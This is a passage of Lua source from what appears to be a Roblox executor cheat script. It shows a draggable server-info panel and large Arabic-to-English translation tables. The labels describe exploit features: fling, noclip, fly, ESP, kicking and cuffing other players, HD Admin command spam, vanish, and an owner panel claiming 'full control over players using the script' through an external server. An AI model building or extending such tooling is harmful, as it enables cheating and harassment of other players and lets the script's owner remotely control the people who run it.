        closeBtn.TextColor3 = Theme.Muted
        closeBtn.Font = Enum.Font.GothamBold
        closeBtn.TextSize = 13
        closeBtn.ZIndex = 4
        closeBtn.Parent = header
        makeCorner(closeBtn, 8)
        local closeStroke = makeStroke(closeBtn, Theme.Border, 1, 0.1)
        closeBtn.MouseEnter:Connect(function()
            TweenService:Create(closeBtn, TweenInfo.new(0.12), { BackgroundColor3 = Theme.Danger, TextColor3 = Theme.Text }):Play()
            TweenService:Create(closeStroke, TweenInfo.new(0.12), { Transparency = 1 }):Play()
        end)
        closeBtn.MouseLeave:Connect(function()
            TweenService:Create(closeBtn, TweenInfo.new(0.12), { BackgroundColor3 = Theme.ButtonDefault, TextColor3 = Theme.Muted }):Play()
            TweenService:Create(closeStroke, TweenInfo.new(0.12), { Transparency = 0.1 }):Play()
        end)
        closeBtn.MouseButton1Click:Connect(closeServerInfo)

        -- LIVE pill
        local pill = Instance.new("Frame")
        pill.Size = UDim2.new(0, 56, 0, 22)
        pill.Position = UDim2.new(0, 48, 0, 14)
        pill.BackgroundColor3 = Theme.PanelSoft
        pill.BorderSizePixel = 0
        pill.ZIndex = 4
        pill.Parent = header
        makeCorner(pill, 11)
        makeStroke(pill, Theme.Border, 1, 0.2)
        local dot = Instance.new("Frame")
        dot.Size = UDim2.new(0, 7, 0, 7)
        dot.Position = UDim2.new(0, 9, 0.5, -3)
        dot.BackgroundColor3 = HUD_SOFT_GREEN
        dot.BorderSizePixel = 0
        dot.ZIndex = 5
        dot.Parent = pill
        makeCorner(dot, 4)
        TweenService:Create(dot, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), { BackgroundTransparency = 0.75 }):Play()
        hudLabel(pill, "LIVE", UDim2.new(1, -22, 1, 0), UDim2.new(0, 20, 0, 0), Enum.Font.GothamBlack, 10, Theme.Text, Enum.TextXAlignment.Left, 5)

        local divider = Instance.new("Frame")
        divider.Size = UDim2.new(1, -24, 0, 1)
        divider.Position = UDim2.new(0, 12, 0, 50)
        divider.BackgroundColor3 = Theme.Border
        divider.BackgroundTransparency = 0.3
        divider.BorderSizePixel = 0
        divider.ZIndex = 3
        divider.Parent = card

        -- ===== Hero: Map info =====
        local hero = siCard(card, UDim2.new(1, -24, 0, 98), UDim2.new(0, 12, 0, 62))
        local accent = Instance.new("Frame")
        accent.Size = UDim2.new(0, 3, 0.6, 0)
        accent.AnchorPoint = Vector2.new(1, 0.5)
        accent.Position = UDim2.new(1, -8, 0.5, 0)
        accent.BackgroundColor3 = Theme.Accent
        accent.BorderSizePixel = 0
        accent.ZIndex = 4
        accent.Parent = hero
        makeCorner(accent, 2)

        hudLabel(hero, siL("الماب", "Experience"), UDim2.new(1, -130, 0, 16), UDim2.new(0, 112, 0, 10), Enum.Font.GothamMedium, 12, Theme.Muted, nil, 4)
        local mapNameLbl = hudLabel(hero, siL("جاري التحميل...", "Loading..."), UDim2.new(1, -130, 0, 26), UDim2.new(0, 112, 0, 27), Enum.Font.GothamBlack, 20, Theme.Text, nil, 4)
        mapNameLbl.TextTruncate = Enum.TextTruncate.AtEnd
        local creatorLbl = hudLabel(hero, "", UDim2.new(1, -130, 0, 14), UDim2.new(0, 112, 0, 58), Enum.Font.Gotham, 11, Theme.Muted, nil, 4)
        creatorLbl.TextTruncate = Enum.TextTruncate.AtEnd
        local updatedLbl = hudLabel(hero, "", UDim2.new(1, -130, 0, 14), UDim2.new(0, 112, 0, 74), Enum.Font.Gotham, 11, Theme.Muted, nil, 4)

        local heroSep = Instance.new("Frame")
        heroSep.Size = UDim2.new(0, 1, 1, -28)
        heroSep.Position = UDim2.new(0, 102, 0, 14)
        heroSep.BackgroundColor3 = Theme.Border
        heroSep.BorderSizePixel = 0
        heroSep.ZIndex = 4
        heroSep.Parent = hero
        hudLabel(hero, siL("يلعبونه الحين", "Playing Now"), UDim2.new(0, 90, 0, 14), UDim2.new(0, 6, 0, 22), Enum.Font.GothamMedium, 11, Theme.Muted, Enum.TextXAlignment.Center, 4)
        local playingLbl = hudLabel(hero, "--", UDim2.new(0, 90, 0, 30), UDim2.new(0, 6, 0, 38), Enum.Font.GothamBlack, 24, Theme.Text, Enum.TextXAlignment.Center, 4)
        hudLabel(hero, siL("باللعبة كلها", "across all servers"), UDim2.new(0, 90, 0, 12), UDim2.new(0, 6, 0, 68), Enum.Font.Gotham, 10, Theme.Muted, Enum.TextXAlignment.Center, 4)

        local function siLoadMapInfo()
            task.spawn(function()
                local ok, info = pcall(function()
                    return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
                end)
                if not (mapNameLbl and mapNameLbl.Parent) then return end
                if ok and type(info) == "table" then
                    mapNameLbl.Text = tostring(info.Name or "--")
                    local creator = info.Creator and info.Creator.Name
                    if creator then
                        creatorLbl.Text = siL("صانعه: ", "By: ") .. tostring(creator)
                    end
                    local ago = siAgo(info.Updated, siServerNow())
                    if ago then
                        updatedLbl.Text = siL("آخر تحديث: ", "Updated: ") .. ago
                    end
                else
                    mapNameLbl.Text = "--"
                end
            end)
        end
        local function siLoadPlaying()
            task.spawn(function()
                local res = t18_httpRequest({
                    Url = "https://games.roblox.com/v1/games?universeIds=" .. tostring(game.GameId),
                    Method = "GET",
                    Headers = { ["Accept"] = "application/json" },
                })
                if not (playingLbl and playingLbl.Parent) or not res then return end
                local data = t18_jsonDecode(res.Body or res.body or "")
                local g = data and type(data.data) == "table" and data.data[1]
                if g and g.playing then
                    playingLbl.Text = siShortNum(g.playing)
                end
            end)
        end
        siLoadMapInfo()
        siLoadPlaying()

        -- ===== Clock row =====
        local half = (W - 24 - 8) / 2
        local clockCard = siCard(card, UDim2.new(0, half, 0, 58), UDim2.new(0, 12 + half + 8, 0, 170))
        hudLabel(clockCard, siL("وقت السيرفر", "Server Time"), UDim2.new(1, -20, 0, 14), UDim2.new(0, 10, 0, 8), Enum.Font.GothamMedium, 11, Theme.Muted, nil, 4)
        local clockLbl = hudLabel(clockCard, "--:--:--", UDim2.new(1, -20, 0, 24), UDim2.new(0, 10, 0, 26), Enum.Font.GothamBold, 17, Theme.Text, nil, 4)

        local utcCard = siCard(card, UDim2.new(0, half, 0, 58), UDim2.new(0, 12, 0, 170))
        hudLabel(utcCard, "UTC", UDim2.new(1, -20, 0, 14), UDim2.new(0, 10, 0, 8), Enum.Font.GothamMedium, 11, Theme.Muted, nil, 4)
        local utcLbl = hudLabel(utcCard, "--:--:--", UDim2.new(1, -20, 0, 24), UDim2.new(0, 10, 0, 26), Enum.Font.GothamBold, 17, Theme.Text, nil, 4)

        -- ===== Stats row =====
        local third = (W - 24 - 16) / 3
        local function statCard(index, title)
            local x = 12 + (2 - index) * (third + 8)
            local c = siCard(card, UDim2.new(0, third, 0, 58), UDim2.new(0, x, 0, 238))
            hudLabel(c, title, UDim2.new(1, -16, 0, 14), UDim2.new(0, 8, 0, 8), Enum.Font.GothamMedium, 11, Theme.Muted, nil, 4)
            local v = hudLabel(c, "--", UDim2.new(1, -16, 0, 22), UDim2.new(0, 8, 0, 24), Enum.Font.GothamBold, 16, Theme.Text, nil, 4)
            return c, v
        end
        local playersCard, playersLbl = statCard(0, siL("اللاعبين", "Players"))
        local _, typeLbl = statCard(1, siL("نوع السيرفر", "Server Type"))
        local _, friendsLbl = statCard(2, siL("خويانك هنا", "Friends Here"))
        local siFriendCache = {}
        local siFriendBusy = false
        local function siRefreshFriends()
            if siFriendBusy then return end
            siFriendBusy = true
            task.spawn(function()
                local n = 0
                for _, plr in ipairs(Players:GetPlayers()) do
                    if plr ~= LocalPlayer then
                        local uid = plr.UserId
                        if siFriendCache[uid] == nil then
                            local ok, res = pcall(function() return LocalPlayer:IsFriendsWith(uid) end)
                            siFriendCache[uid] = ok and res == true
                        end
                        if siFriendCache[uid] then n += 1 end
                    end
                end
                if friendsLbl and friendsLbl.Parent then
                    friendsLbl.Text = tostring(n)
                    friendsLbl.TextColor3 = n > 0 and HUD_SOFT_GREEN or Theme.Text
                end
                siFriendBusy = false
            end)
        end
        siRefreshFriends()
        table.insert(ServerInfoConns, Players.PlayerAdded:Connect(function() task.wait(1); siRefreshFriends() end))
        table.insert(ServerInfoConns, Players.PlayerRemoving:Connect(function() task.defer(siRefreshFriends) end))
        do
            local psId = tostring(game.PrivateServerId or "")
            local psOwner = tonumber(game.PrivateServerOwnerId) or 0
            if psId == "" then
                typeLbl.Text = siL("عام", "Public")
            elseif psOwner ~= 0 then
                typeLbl.Text = siL("خاص VIP", "Private VIP")
            else
                typeLbl.Text = siL("محجوز", "Reserved")
            end
        end

        local barBg = Instance.new("Frame")
        barBg.Size = UDim2.new(1, -16, 0, 3)
        barBg.Position = UDim2.new(0, 8, 1, -9)
        barBg.BackgroundColor3 = Theme.AccentSoft
        barBg.BorderSizePixel = 0
        barBg.ZIndex = 4
        barBg.Parent = playersCard
        makeCorner(barBg, 2)
        local barFill = Instance.new("Frame")
        barFill.AnchorPoint = Vector2.new(1, 0)
        barFill.Position = UDim2.new(1, 0, 0, 0)
        barFill.Size = UDim2.new(0, 0, 1, 0)
        barFill.BackgroundColor3 = Theme.Accent
        barFill.BorderSizePixel = 0
        barFill.ZIndex = 5
        barFill.Parent = barBg
        makeCorner(barFill, 2)

        -- ===== Job ID row =====
        local jobId = tostring(game.JobId)
        if jobId == "" then jobId = "studio" end
        local jobCard = siCard(card, UDim2.new(1, -24, 0, 40), UDim2.new(0, 12, 0, 306))
        hudLabel(jobCard, "Job ID", UDim2.new(0, 50, 1, 0), UDim2.new(1, -60, 0, 0), Enum.Font.GothamMedium, 11, Theme.Muted, nil, 4)
        local jobLbl = hudLabel(jobCard, jobId, UDim2.new(1, -124, 1, 0), UDim2.new(0, 60, 0, 0), Enum.Font.Code, 12, Theme.Text, Enum.TextXAlignment.Left, 4)
        jobLbl.TextTruncate = Enum.TextTruncate.AtEnd
        local copyJob = siButton(jobCard, siL("نسخ", "Copy"), UDim2.new(0, 46, 0, 26), UDim2.new(0, 7, 0, 7))
        copyJob.TextSize = 11
        copyJob.MouseButton1Click:Connect(function()
            if siCopy(jobId) then siFlash(copyJob, "✓", siL("نسخ", "Copy")) else siFlash(copyJob, "✕", siL("نسخ", "Copy")) end
        end)

        -- ===== Actions =====
        local bW = (W - 24 - 16) / 3
        local placeTxt = siL("نسخ Place ID", "Copy Place ID")
        local linkTxt = siL("نسخ رابط السيرفر", "Copy Server Link")
        local rejoinTxt = siL("ريجوين", "Rejoin")
        local btnLink = siButton(card, linkTxt, UDim2.new(0, bW, 0, 34), UDim2.new(0, 12 + 2 * (bW + 8), 0, 354))
        local btnPlace = siButton(card, placeTxt, UDim2.new(0, bW, 0, 34), UDim2.new(0, 12 + (bW + 8), 0, 354))
        local btnRejoin = siButton(card, rejoinTxt, UDim2.new(0, bW, 0, 34), UDim2.new(0, 12, 0, 354))

        btnLink.MouseButton1Click:Connect(function()
            local link = string.format("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s", game.PlaceId, jobId)
            if siCopy(link) then siFlash(btnLink, siL("تم النسخ ✓", "Copied ✓"), linkTxt) else siFlash(btnLink, siL("غير مدعوم", "Unsupported"), linkTxt) end
        end)
        btnPlace.MouseButton1Click:Connect(function()
            if siCopy(tostring(game.PlaceId)) then siFlash(btnPlace, siL("تم النسخ ✓", "Copied ✓"), placeTxt) else siFlash(btnPlace, siL("غير مدعوم", "Unsupported"), placeTxt) end
        end)
        btnRejoin.MouseButton1Click:Connect(function()
            btnRejoin.Text = siL("جاري...", "Joining...")
            local TS = game:GetService("TeleportService")
            local ok = pcall(function()
                if #Players:GetPlayers() > 1 and jobId ~= "studio" then
                    TS:TeleportToPlaceInstance(game.PlaceId, jobId, LocalPlayer)
                else
                    TS:Teleport(game.PlaceId, LocalPlayer)
                end
            end)
            if not ok then siFlash(btnRejoin, siL("فشل", "Failed"), rejoinTxt) end
        end)

        -- ===== Drag (from header) =====
        do
            local dragging, dragStart, startPos = false, nil, nil
            table.insert(ServerInfoConns, header.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    dragging, dragStart, startPos = true, input.Position, holder.Position
                end
            end))
            table.insert(ServerInfoConns, UserInputService.InputChanged:Connect(function(input)
                if not dragging then return end
                if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                    local d = (input.Position - dragStart) / math.max(scale.Scale, 0.1)
                    holder.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X * scale.Scale, startPos.Y.Scale, startPos.Y.Offset + d.Y * scale.Scale)
                end
            end))
            table.insert(ServerInfoConns, UserInputService.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    dragging = false
                end
            end))
        end

        -- ===== Live update =====
        local statTimer, msTimer, playingTimer = 0, 0, 0
        local function refreshStats()
            local count, maxP = #Players:GetPlayers(), Players.MaxPlayers
            playersLbl.Text = string.format("%d/%d", count, maxP)
            TweenService:Create(barFill, TweenInfo.new(0.25), { Size = UDim2.new(math.clamp(count / math.max(maxP, 1), 0, 1), 0, 1, 0) }):Play()
        end
        local function refreshTime()
            local now = siServerNow()
            clockLbl.Text = siFmtClock(now)
            local u = os.date("!*t", math.floor(now))
            utcLbl.Text = string.format("%02d:%02d:%02d", u.hour, u.min, u.sec)
        end
        refreshTime()
        refreshStats()
        table.insert(ServerInfoConns, RunService.Heartbeat:Connect(function(dt)
            if not ServerInfoGui then return end
            statTimer += dt
            msTimer += dt
            playingTimer += dt
            if playingTimer >= 30 then
                playingTimer = 0
                siLoadPlaying()
            end
            if msTimer >= 0.2 then
                msTimer = 0
                refreshTime()
            end
            if statTimer >= 1 then
                statTimer = 0
                refreshStats()
            end
        end))

        -- ===== Open animation =====
        TweenService:Create(card, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { GroupTransparency = 0 }):Play()
        TweenService:Create(scale, TweenInfo.new(0.32, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = targetScale }):Play()
    end

    if ServerInfoBtn2 then
        ServerInfoBtn2.MouseButton1Click:Connect(function()
            if ServerInfoGui then closeServerInfo(); return end
            openServerInfo()
        end)
    end
end)()

LocalPlayer.CharacterAdded:Connect(function()
    if SpectateActive then
        stopSpectate()
    else
        restoreMyCamera()
    end
    if flingActive then
        flingActive = false
        setButtonState(FlingBtn, false, T18T("الحماية شغالة"), T18T("حماية بانق"), Theme.Active, Theme.PanelSoft)
    end
    if _G._ZWA then
        _G._ZOrig = nil
        _G._ZWA = false
        task.wait(0.5)
        ZombieWalkBtn:Activate()
    end
    if _G._HLA then
        _G._HLA = false
        task.wait(0.5)
        _G._HLBtn:Activate()
    end

end)

;(function()
_T18TR = {

    ["القوائم"]                                   = "Menus",
    ["اختر القسم"]                                = "Choose Section",

    ["اللاعب"]                                    = "Player",
    ["استهداف"]                                   = "Target",
    ["مهم"]                                       = "Important",
    ["اونر"]                                      = "Owner",
    ["اخرى"]                                      = "Others",
    ["اللغة"]                                     = "Language",

    ["القائمة الرئيسية"]                          = "Main Menu",
    ["ميزات اضافية"]                              = "Extra Features",
    ["اوامر الحركة والسرعة"]                      = "Movement & Speed",
    ["اوامر التعامل مع اللاعبين"]                 = "Player Interaction",
    ["رسالة داخل السكربت"]                        = "Script Message",
    ["اوامر الادارة الخاصة"]                      = "Admin Commands",
    ["ملاحظة مهمة : يا اخوان حماية البانق ما تشتغل الا على سكربت V.R.7"] =
        "Important Note: Bang Protection only works on script V.R.7",

    ["بانق"]                                      = "Bang",
    ["ريسيت"]                                     = "Reset",
    ["حماية بانق"]                                = "Bang Protect",
    ["فلنق"]                                      = "Fling",
    ["طيران"]                                     = "Fly",
    ["سرعة اللاعب"]                               = "Walk Speed",
    ["مشية زومبي"]                                = "Zombie Walk",
    ["هيدلس"]                                     = "Headless",
    ["تنقل"]                                      = "Teleport",
    ["مشاهدة"]                                    = "Spectate",
    ["هيد بانق"]                                  = "Head Bang",
    ["حفظ مكاني"]                                 = "Save Pos",
    ["تعليق"]                                     = "Hang",
    ["تجميد"]                                     = "Freeze",
    ["كلبش"]                                      = "Cuff",
    ["سحب"]                                       = "Pull",
    ["طرد"]                                       = "Kick",
    ["استدعاء"]                                   = "Summon",
    ["ارسال"]                                     = "Send",
    ["نسخ رابط الدسكورد"]                         = "Copy Discord",

    ["ايقاف هيدلس"]                               = "Stop Headless",
    ["ايقاف الفلنق"]                              = "Stop Fling",
    ["ايقاف"]                                     = "Stop",
    ["ايقاف الطيران"]                             = "Stop Fly",
    ["جاري التعليق..."]                            = "Hanging...",
    ["الغاء المشاهدة"]                            = "Stop Spectate",
    ["فك التجميد"]                                = "Unfreeze",
    ["ايقاف الاستدعاء"]                           = "Stop Summon",

    ["اكتب اسم اللاعب هنا"]                       = "Enter player name",
    ["سرعة الطيران"]                              = "Fly speed",
    ["سرعة المشي"]                                = "Walk speed",
    ["اكتب رسالة..."]                              = "Type a message...",
    ["اكتب 4 احرف من يوزر اللاعب"]               = "Enter 4 chars of username",

    ["التحكم الرئيسي"]                            = "Main Controls",
    ["شات"]                                       = "Chat",
    ["تواصل بين مشغلي السكربت"]                   = "Script users chat",
    [" مستخدمين السكربت "]                   = " Script Users ",
    ["العدد: "]                                   = "Count: ",

    ["اكتب 4 احرف على الاقل"]                    = "Enter at least 4 chars",
    ["لا يوجد لاعب مطابق"]                        = "No matching player",
    ["تم تحديد: "]                                = "Selected: ",

    ["ما عندك كلبشة!"]                            = "You don't have a cuff!",
    ["تم التعليق!"]                               = "Hung successfully!",
    ["فشلت الكلبشة، حاول مجدداً"]                 = "Cuff failed, try again",
    ["ما لقيت اللاعب، تاكد من الاسم"]             = "Player not found, check name",
    ["كلبشة"]                                     = "Cuff",
    ["تم استدعاؤك بواسطة الاونر"]                 = "Summoned by Owner",
    ["انتهى الاستدعاء"]                           = "Summon ended",
    ["اكتب 4 احرف من يوزر اللاعب او اكثر"]       = "Enter at least 4 chars",
    ["ما قدرت ارسل الامر — تاكد ان المُشغِّل يدعم HTTP"] =
        "Couldn't send command — check executor HTTP",
    ["تم نسخ رابط الدسكورد"]                      = "Discord link copied",
    ["تم ايقاف الاستدعاء"]                        = "Summon stopped",
    ["اكتب يوزر اللاعب في خانة الكتابة"]          = "Enter player username in the box",
    ["ادخل الـ Prefix الخاص بك"]                  = "Enter your Prefix",
    ["تم ايقاف النسخ"]                            = "Copy stopped",
    ["اللاعب خرج من السيرفر"]                      = "Player left the server",
    ["تم تفعيل النسخ على "]                        = "Copy activated on ",
    ["تم تفعيل الاستدعاء لـ "]                     = "Summon activated for ",
    ["النظام"]                                    = "System",
    ["ما قدرت ارسل الرسالة — تاكد ان المُشغِّل يدعم HTTP"] =
        "Couldn't send message — check executor HTTP",
    ["مرحبًا! هذي شاشة شات خاصة بمشغّلي السكربت فقط — تمر عبر سيرفر خارجي ولا تظهر لاي لاعب ما يستخدم السكربت."] =
        "Hello! This is a private chat for script users only — routed through an external server and not visible to other players.",

    ["مضادات"]                                       = "Anti Cheats",
    ["الحماية والمضادات"]                             = "Protection & Anti Tools",
    ["كلبشات"]                                        = "Cuffs",
    ["اوامر الكلبشة"]                                 = "Cuff Commands",
    ["حماية كلبشه2"]                                 = "Cuff Protect 2",
    ["مضاد NV"]                                      = "Anti NV",
    ["يمنع تكرار امر nv لتعليق الجهاز"]             = "Prevents repeated nv command to lag device",
    [" ايقاف مضاد NV"]                            = " Stop Anti NV",
    [" ايقاف كلبشه2"]                             = " Stop Cuff Protect 2",
    ["مضادات"]                                  = "Protections",
    ["مضاد افك"]                                     = "Anti AFK",
    ["حماية كلبشة"]                                  = "Cuff Protect",
    ["جاذبية منخفضة"]                                = "Low Gravity",
    ["مضاد لاج"]                                     = "Anti Lag",
    ["معلومات السيرفر"]                              = "Server Info",
    ["وقتك بالسيرفر"]                                = "Server Time",
    ["ايقاف المؤقت"]                                 = "Stop Timer",
    ["الحجم"]                                        = "Size",
    ["الاداء"]                                       = "Performance",
    ["دخلت"]                                         = "Joined",
    ["لاعبين"]                                       = "Players",
    ["دخلوا بعدك"]                                   = "Joined after",
    ["وقت وجودك بالسيرفر"]                          = "Your Server Time",
    ["اختراق جدران"]                                 = "Noclip",
    ["قفز لا نهائي"]                                 = "Infinite Jump",
    ["تسلق الجدران"]                                 = "Wall Climb",

    ["ايقاف مشية زومبي"]                             = "Stop Zombie Walk",
    ["ايقاف الحماية"]                                = "Stop Protection",
    ["ايقاف اختراق"]                                 = "Stop Noclip",
    ["ايقاف الجاذبية"]                               = "Stop Low Grav",
    ["ايقاف القفز"]                                  = "Stop Inf Jump",
    ["ايقاف التسلق"]                                 = "Stop Wall Climb",
    ["اختفاء"]                                       = "Vanish",
    ["ايقاف الاختفاء"]                               = "Stop Vanish",
    ["ايقاف ESP"]                                    = "Stop ESP",
    ["ايقاف مضاد لاج"]                               = "Stop Anti Lag",
    ["مضاد لاق (للصمله)"]                            = "Anti Lag (Potato PC)",
    ["ايقاف وضع الصمله"]                             = "Stop Potato Mode",
    ["جاري تفعيل وضع الصمله..."]                     = "Enabling Potato Mode...",
    ["تم ايقاف وضع الصمله (المحذوف يرجع بالرجوين)"]   = "Potato Mode off (removed parts return on rejoin)",
    ["اخبار"]                                        = "News",
    ["آخر التحديثات والازرار الجديده"]                = "Latest updates & new buttons",
    ["الازرار الجديده"]                              = "New Buttons",
    ["الازرار اللي عدلت عليها"]                      = "Updated Buttons",
    ["كلمة من المطور"]                               = "A word from the developer",
    ["ايقاف مضاد افك"]                               = "Stop Anti AFK",
    ["عمر السيرفر: "]                                = "Server Age: ",

    ["اوامر شاليه محمد"]                             = "Shale's Commands",
    ["تفعيل نسخ"]                                    = "Enable Copy",
    ["ايقاف النسخ"]                                  = "Stop Copy",
    ["Prefix الـ HD (تلقائي او يدوي)"]               = "HD Prefix (Auto or Manual)",
    ["مثال: ,"]                                      = "Example: ,",
    ["عندك مشكلة؟ تواصل دسكورد"]                         = "Got a problem? Contact me on Discord.",
    ["شاركونا اقتراحاتكم على الدسكورد"]              = "Share feedback on Discord",
    ["شاركونا اقتراحاتكم على الدسكورد | اضغط الزر الصغير لاخفاء النافذة"] =
        "Share feedback on Discord | Press the small button to hide",
    ["ايقاف Respawn Loop"]                            = "Stop Respawn Loop",

    ["السرعة مفعلة"]                                  = "Speed Active",
    ["الحماية شغالة"]                                 = "Protect Active",
    ["رجوع للمكان"]                                   = "Return to Pos",
    ["ايقاف FPS/Ping"]                                = "Stop FPS/Ping",
}

-- Extra UI copy that used to be left in Arabic when English was selected.
local _T18ExtraTR = {
    ["السكربت متصل بالفعل."] = "This script is already running.",
    ["هذا اونر السكربت ما تقدر تفعل عليه"] = "That's the script owner—you can't use that on them.",
    ["اهلًا "] = "Hey, ",
    ["الاعدادات"] = "Settings",
    ["تخصيص الواجهة"] = "Customize the interface",
    ["R7L AI تقدر تسأله اي سؤال بخاطرك وان شاء الله ما يقصر معك"] = "Ask R7L AI anything on your mind—hopefully, it won't let you down.",
    ["رابط R7L AI يُشتق تلقائيًا من T18_API_BASE"] = "The R7L AI URL is built automatically from T18_API_BASE.",
    ["تحقق من رابط T18_API_BASE أولًا"] = "Check your T18_API_BASE URL first.",
    ["اكتب رسالتك لـ R7L AI..."] = "Message R7L AI...",
    ["أنت"] = "You",
    ["R7L AI يكتب الآن..."] = "R7L AI is typing...",
    ["متصل"] = "Connected",
    ["تعذر الاتصال: "] = "Couldn't connect: ",
    ["تحقق من الرابط وإعدادات HTTP"] = "Check the URL and your HTTP settings.",
    ["تم مسح المحادثة"] = "Chat cleared.",
    ["أهلًا، أنا R7L AI. اكتب رسالتك للبدء."] = "Hey, I'm R7L AI. Send me a message to get started.",
    ["مسح"] = "Clear",
    ["متأكد؟"] = "Are you sure?",
    ["ما اقدر انقلك لهالسيرفر"] = "I can't move you to that server.",
    ["انت معه بنفس السيرفر"] = "You're already in the same server as them.",
    ["الماب مانع النقل، نسخت لك رابط السيرفر"] = "The game blocked the teleport, so I copied the server link for you.",
    ["انطرد "] = "Kicked ",
    ["فشل الطرد: "] = "Kick failed: ",
    ["السيرفر ما رد"] = "The server didn't respond.",
    ["جاري النقل لـ "] = "Teleporting to ",
    ["انتقل"] = "Join",
    [" (انت)"] = " (you)",
    ["الماب: "] = "Game: ",
    ["معك بنفس السيرفر"] = "In your server",
    ["تحكم كامل باللاعبين المشغلين للسكربت"] = "Full control over players using the script.",
    ["للمشتركين"] = "Subscribers",
    ["اكتب رسالة لارسالها..."] = "Type a message to send...",
    ["صانع السكربت: "] = "Script creator: ",
    ["اختر اللاعب المقصود"] = "Choose the player you meant.",
    ["وُجد اكثر من لاعب بنفس الاسم"] = "More than one player has that name.",
    ["الغاء"] = "Cancel",
    ["مكانه: "] = "Section: ",
    ["قسم الاخبار"] = "News",

    ["أغاني"] = "Songs",
    ["قائمة الأغاني"] = "Song Playlist",
    ["لم يتم اختيار أغنية"] = "No song selected",
    ["الأغنية الأولى"] = "Song 1",
    ["الأغنية الثانية"] = "Song 2",
    ["الأغنية الثالثة"] = "Song 3",
    ["الأغنية الرابعة"] = "Song 4",
    ["تشغيل"] = "Play",
    ["إيقاف مؤقت"] = "Pause",
    ["السابق"] = "Previous",
    ["التالي"] = "Next",
    ["مستوى الصوت: "] = "Volume: ",
    ["يعمل الآن: "] = "Now playing: ",
    ["تعذر تشغيل المقطع"] = "Couldn't play this track.",
    ["اوامر كلبشه فقط لشاليه عوده"] = "Cuff commands are for Shaleh Oudah only.",
    ["قسم مضادات"] = "Anti Tools",
    ["قسم اللاعب"] = "Player",
    ["قسم اخرى"] = "Other",
    ["قسم الاعدادات"] = "Settings",
    ["اقدم لكم يا احبائي R7L AI , نموذج GPT سريع وما يتأخر في الرد وبيعجبكم حرفياً, فكره جديده ما اتوقع احد سواها, عالعموم اتمنى يعجبك واذا حصلت لك مشاكل تواصل معي بالدسكورد بتحصل رابط سيرفر الدسكورد في القائمة الرئيسية"] = "Hey everyone, I'm happy to introduce R7L AI: a GPT model that replies fast and doesn't keep you waiting. I honestly think you'll love it. It's a fresh idea—I don't think anyone's done it before. Anyway, I hope you enjoy it. If you run into any trouble, contact me on Discord; the server invite is on the main menu.",
    ["مضاد بانق2"] = "Anti-Bang 2",
    ["اذا احد فعل عليك بانق فعل الزر ذا, بينكسر البانق حقه تقريباً 3 ثواني وبيرجع ينكسر مهما كان السكربت, اتمنى يعجبك يعيوني"] = "If someone uses Bang on you, hit this button: it breaks their Bang for about three seconds, then keeps breaking it no matter what script they're using. Hope you like it, buddy.",
    ["مضاد لاق تفعله اذا تبي تصمل مع احد, يشيل الظلال والاشياء ذي, والله ياهو جامد الصدق"] = "Turn on Anti-Lag when you're trying to outlast someone. It strips out shadows and stuff. Honestly, this thing is pretty sick.",
    ["مضاد فويد"] = "Anti-Void",
    ["صراحه ذا الشي الوحيد اللي ماتعبت عليه سويته عالسريع و ما يهمني بس لا تفعله وانت مفعل بانق ممكن اللي ضدك يسوي سبام للفويد ويصير يموتك تلقائي"] = "Honestly, this is the one thing I barely worked on—I threw it together quickly and didn't really care. Just don't turn it on while Bang is active; the other person might spam void and make you die automatically.",
    ["سبام اوامر ادمن, طبعاً لازم تكتب الحرف او الرمز اللي تكتب فيه الامر حقك مثل ; او ! وبس اتمنى يعجبكم (لازم الماب يكون فيه HD Admin)"] = "Admin-command spam. You do need to enter your command prefix—the character or symbol you use, like ; or !. That's it. Hope you enjoy it (the game needs to have HD Admin).",
    ["سبام سكنات تستخدمه اذا ماودك احد يكلبشك ويغثك, بعض المابات ما يضبط فيها الزر ذا"] = "Use Skin Spam if you don't want someone cuffing you and being a pain. This button doesn't work in some games.",
    ["الافضل تحطه اذا جيت تصمل وحاول ما تحط معه سبام سكنات عشان فيه كولدون تلقائي من HD ADMIN يمنع السبام السريع"] = "Best used when you're trying to outlast someone. Try not to pair it with Skin Spam; HD Admin has a cooldown that blocks commands sent too quickly.",
    ["اذا كنت مدرك انفنتي فعل الزر واطرح عدادك نشوف كم تصمل"] = "If you're an Infinite user, turn this on and drop your timer—let's see how long you can last.",
    ["صار شكلها اجمل وتطلع تفاصيل اكثر"] = "It has a cleaner look and shows more details.",
    ["حجم السكربت كبير جدا وكبير ومتوسط وصغير, نصيحتي لك خله افتراضي اطلق شي"] = "The script comes in Huge, Large, Medium, and Small. My advice? Leave it on Default—that's the best one.",
    ["يطلع لك تقريباً كل شي عن السيرفر, صراحه تعبت عليها مره والله, خذت مني ايام كثير"] = "It shows pretty much everything about the server. Honestly, I put a ton of work into this—it took me days.",
    ["كلام مني لكم"] = "A word from me",
    ["رقم الحساب: "] = "User ID: ",
    ["تاريخ التسجيل: %02d/%02d/%04d"] = "Account created: %02d/%02d/%04d",
    [" سنة و"] = " years and ",
    [" شهر"] = " months",
    ["عداد"] = "Counter",
    ["اكتب اسم اللاعب هنا..."] = "Enter a player name...",
    ["مسح السجل"] = "Clear History",
    ["لا يوجد سجل"] = "No history yet",
    ["خرج من السيرفر"] = "Left the server",
    ["• في السيرفر"] = "• In server",
    ["• خرج من السيرفر"] = "• Left the server",
    ["في السيرفر"] = "In server",
    ["خرج "] = "Left ",
    [" مرات"] = " times",
    ["دخول "] = "Joined ",
    ["  |  خروج "] = "  |  Left ",
    ["خارج: "] = "Offline: ",
    ["منذ "] = "For ",
    ["مشاهدة: "] = "Watching: ",
    ["اوامر شاليه محمد (الاصلي فقط)"] = "Shaleh's commands (original owner only)",
    ["لازم يكون معك مود (احبك)"] = "You need to have the mod with you (love you).",
    ["نسخ HD"] = "Copy HD",
    ["نسخ محور"] = "Copy Pivot",
